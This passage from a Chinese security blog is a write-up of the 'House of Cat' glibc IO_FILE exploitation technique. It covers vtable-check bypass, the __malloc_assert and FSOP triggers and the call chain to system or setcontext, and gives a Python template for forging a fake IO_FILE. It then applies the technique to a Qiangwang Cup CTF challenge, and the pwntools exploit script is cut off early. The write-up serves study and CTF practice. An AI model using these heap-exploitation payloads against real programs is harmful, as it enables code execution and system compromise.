class="hljs-number">0x1</span>)<br>[#<span class="hljs-number">3</span>] <span class="hljs-number">0x7ffff7a47045</span> → Name: __GI_exit(status=&lt;optimized out&gt;)<br>[#<span class="hljs-number">4</span>] <span class="hljs-number">0x4005ce</span> → Name: main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IO_FILE】house of cat</title>
    <link href="/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/"/>
    <url>/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用**_IO_wfile_jumps<strong>中的</strong>_IO_wfile_seekoff<strong>函数，然后进入到</strong>_IO_switch_to_wget_mode<strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在</strong>FSOP<strong>的情况下也是可行的，只需修改虚表指针的偏移来调用</strong>_IO_wfile_seekoff<strong>即可（通常是结合</strong>__malloc_assert<strong>，改vtable为</strong>_IO_wfile_jumps+0x10**）。</p><blockquote><p>本文为对CatF1y大佬提出的IO_FILE调用链的学习，原文链接：<a href="https://bbs.pediy.com/thread-273895.htm#msg_header_h1_0">House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解</a></p></blockquote><h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>能够任意写一个可控地址（如large bin attack的任意写堆地址）</li><li>能够泄露libc和堆地址</li><li>能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</li></ul><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><h4 id="IO-FILE结构及利用"><a href="#IO-FILE结构及利用" class="headerlink" title="IO_FILE结构及利用"></a>IO_FILE结构及利用</h4><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，只不过需要任意地址写任意值直接改掉libc中的stdout结构体），当进入IO流时会根据vtable指针调用相关的IO函数，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p><h4 id="vatable检查"><a href="#vatable检查" class="headerlink" title="vatable检查"></a>vatable检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr -(<span class="hljs-type">uintptr_t</span>)__start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>其检查流程为：计算**_IO_vtable 段的长度（section_length)<strong>，用当前虚表指针的地址减去</strong>_IO_vtable 段的开始地址<strong>，如果vtable相对于开始地址的偏移大于等于</strong>section_length<strong>，那么就会进入</strong>_IO_vtable_check<strong>进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入</strong>_IO_vtable_check**函数后会触发<code>abort</code>。</p><p>但同时我们注意到一件事，这里对于vtable的地址检查并非是具体地址，而是一个范围。这样就给了攻击者可操作的空间，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。</p><h4 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h4><p>在glibc中存在一个函数<code>_malloc_assert</code>，其中会根据vtable表如<code>_IO_xxx_jumps</code>调用IO等相关函数；该函数最终会根据stderr这个IO结构体进行相关的IO操作</p><p><img src="/img/article/house_of_cat/image-20221113210513266.png" alt="image-20221113210513266"></p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>         <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>  (<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>             __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>             file, line,<br>             function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>             assertion);<br>  fflush (<span class="hljs-built_in">stderr</span>);<br>  <span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><p>[house of kiwi]([【IO_FILE】House of kiwi - 鷺雨のBlog (loora1n.github.io)](<a href="https://loora1n.github.io/2022/10/27/[IO_FILE]House">https://loora1n.github.io/2022/10/27/[IO_FILE]House</a> of kiwi&#x2F;))提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p><blockquote><p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>下面介绍另一种触发house of cat的方式FSOP:</p><p>程序中所有的<code>_IO_FILE </code>结构用<code>_chain</code>连接形成一个单链表，链表的头部则是<code>_IO_list_all</code></p><p>FSOP就是通过劫持<code>_IO_list_all</code>的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，这个函数会根据<code>_IO_list_all</code>刷新链表中的所有文件流，在libc中代码如下，其中会调用vtable中的IO函数_IO_OVERFLOW，根据我们上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  ...<br>  fp = (_IO_FILE *) _IO_list_all;<br>  <span class="hljs-keyword">while</span> (fp != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>       ...<br>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))<br>               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>           &#123;<br>               result = EOF;<br>          &#125;<br>        ...<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>触发条件则是有三种情况</p><blockquote><p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除;__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p></blockquote><h4 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h4><p>在_IO_wfile_jumps结构体中，会根据虚表进行相关的函数调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_new_file_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wfile_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wfile_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),<br>  JUMP_INIT(doallocate, _IO_wfile_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中_IO_wfile_seekoff函数代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">off64_t</span><br>_IO_wfile_seekoff (FILE *fp, <span class="hljs-type">off64_t</span> offset, <span class="hljs-type">int</span> dir, <span class="hljs-type">int</span> mode)<br>&#123;<br>  <span class="hljs-type">off64_t</span> result;<br>  <span class="hljs-type">off64_t</span> delta, new_offset;<br>  <span class="hljs-type">long</span> <span class="hljs-type">int</span> count;<br> <br>  <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> do_ftell_wide (fp);<br>  <span class="hljs-type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base<br>            == fp-&gt;_wide_data-&gt;_IO_read_end)<br>               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base<br>               == fp-&gt;_wide_data-&gt;_IO_write_ptr));<br>#需要绕过was_writing的检测<br>  <span class="hljs-type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr<br>               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)<br>              || _IO_in_put_mode (fp));<br> <br>  <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))<br>    <span class="hljs-keyword">return</span> WEOF;<br>......<br>&#125;<br></code></pre></td></tr></table></figure><p>其中fp结构体是我们可以伪造的(上面那个截图的rdi，为一个<strong>堆地址</strong>)，可以控制<strong>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</strong>来调用**_IO_switch_to_wget_mode**这个函数，继续跟进代码</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">int<br>_IO_switch_to_wget_mode (FILE *fp)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br>    <span class="hljs-keyword">if</span> ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)<br>      return EOF;<br>  ......<br>&#125;<br></code></pre></td></tr></table></figure><p>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br></code></pre></td></tr></table></figure><p>对_IO_WOVERFLOW没有进行任何检测，为了便于理解，我们再来看看汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64<br>0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]<br>0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx<br>0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi<br>0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]<br>0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]<br>0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56 &lt;_IO_switch_to_wget_mode+56&gt; <br>0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]<br>0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff<br>0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]<br></code></pre></td></tr></table></figure><p>主要关注这几句，做了一下几点事情</p><ul><li>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</li><li>将新赋值的[rax1+0x20]处的内容赋值给rdx。</li><li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li><li>call调用[rax2+0x18]处的内容。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]<br>0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]<br>0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]<br>0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]<br></code></pre></td></tr></table></figure><p>而rdi现在是什么状态呢？gdb调试来看看</p><p><img src="/img/article/house_of_cat/image-20221113211825072.png" alt="image-20221113211825072"></p><p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，即<strong>之前__IO_wfile_seekoff函数传入那个fp</strong>，也是可控的。</p><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在<strong>开启沙箱</strong>的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag<strong>；如果</strong>未开启沙箱<strong>，则只需把</strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入&#x2F;bin&#x2F;sh字符串**，就可执行system(“&#x2F;bin&#x2F;sh”)</p><h4 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end<br>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base<br><span class="hljs-comment">/*如果_wide_data=fake_io_addr+0x30，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="hljs-comment">fp-&gt;_lock是一个可写地址（堆地址libc中的可写地址）*/</span><br></code></pre></td></tr></table></figure><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p><img src="/img/article/house_of_cat/959842_JDJKTRK7GJUEUFR.png" alt="攻击流程图"></p><h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，**_IO_save_end<strong>为想要调用的函数，</strong>_IO_backup_base**为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_io_addr=heapbase+<span class="hljs-number">0xb00</span> <span class="hljs-comment"># 伪造的fake_IO结构体的地址</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE=p64(rdi)         <span class="hljs-comment">#_flags=rdi</span><br>fake_IO_FILE+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rcx!=0(FSOP)</span><br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0xb0</span>)<span class="hljs-comment">#_IO_backup_base=rdx</span><br>fake_IO_FILE +=p64(call_addr)<span class="hljs-comment">#_IO_save_end=call addr(call setcontext/system)</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x1000</span>)  <span class="hljs-comment"># _lock = a writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#_wide_data,rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#mode=1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libcbase+<span class="hljs-number">0x2160c0</span>+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(fake_io_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># rax2_addr</span><br></code></pre></td></tr></table></figure><h2 id="例题：强网杯house-of-cat"><a href="#例题：强网杯house-of-cat" class="headerlink" title="例题：强网杯house of  cat"></a>例题：强网杯house of  cat</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>整体逆向思路类似于[chunqiuIOT](<a href="https://loora1n.github.io/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/">i春秋春季赛-勇者巅峰-chunqiuIOT - 鷺雨のBlog (loora1n.github.io)</a>)那道题，也可以说是<strong>IO_FILE升级版</strong>，这里我们直接看核心的几个函数</p><p><img src="/img/article/house_of_cat/image-20221113212407882.png" alt="add"></p><p><img src="/img/article/house_of_cat/image-20221113212432448.png" alt="del"></p><p><img src="/img/article/house_of_cat/image-20221113212454297.png" alt="edit"></p><p><img src="/img/article/house_of_cat/image-20221113212643434.png" alt="show"></p><ul><li>存在UAF漏洞</li><li>可以申请<strong>0x470~0x418</strong>大小的chunk</li><li>只有两次edit的机会，且长度为0x30</li><li>show函数固定输出0x30长度的内容</li></ul><h3 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./houseofcat  <br></code></pre></td></tr></table></figure><p><img src="/img/article/house_of_cat/image-20221110125159203.png" alt="image-20221110125159203"></p><p>只能使用orw，且限制了fd为0</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>无法退出main函数，也没有exit等能造成FSOP的方式，但是stderr不在bss上而在libc中，可以在得到libc地址后large bin attack位于libc中的stderr，再在得到heap地址的基础上修改top chunk的size，这里用large bin attack修改。所以两次edit相当于给了两次large bin attack的机会，一次用来large bin attack stderr，一次用来large bin attack topchunk’s size。另外由于对fd的检查，需要close(0)使flag文件的文件描述符为0,或者用mmap函数将flag映射读入。</p><ul><li>泄露libc地址和堆地址</li><li>large bin attack stderr</li><li>large bin attack topchunk’s size</li><li>伪造fake_IO</li><li>触发<code>__malloc_assert</code>, 进入<code>_IO_wfile_seekoff</code>转到<code>_IO_switch_to_wget_mode</code></li><li>setcontext执行rop链(orw需要注意fd应先<code>close(0)</code>)</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br><br>io = process(<span class="hljs-string">&#x27;./houseofcat&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;210.30.97.133&#x27;,28065)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>    gdb.attach(proc.pidof(io)[<span class="hljs-number">0</span>],<span class="hljs-string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    payload = <span class="hljs-string">&quot;LOGIN 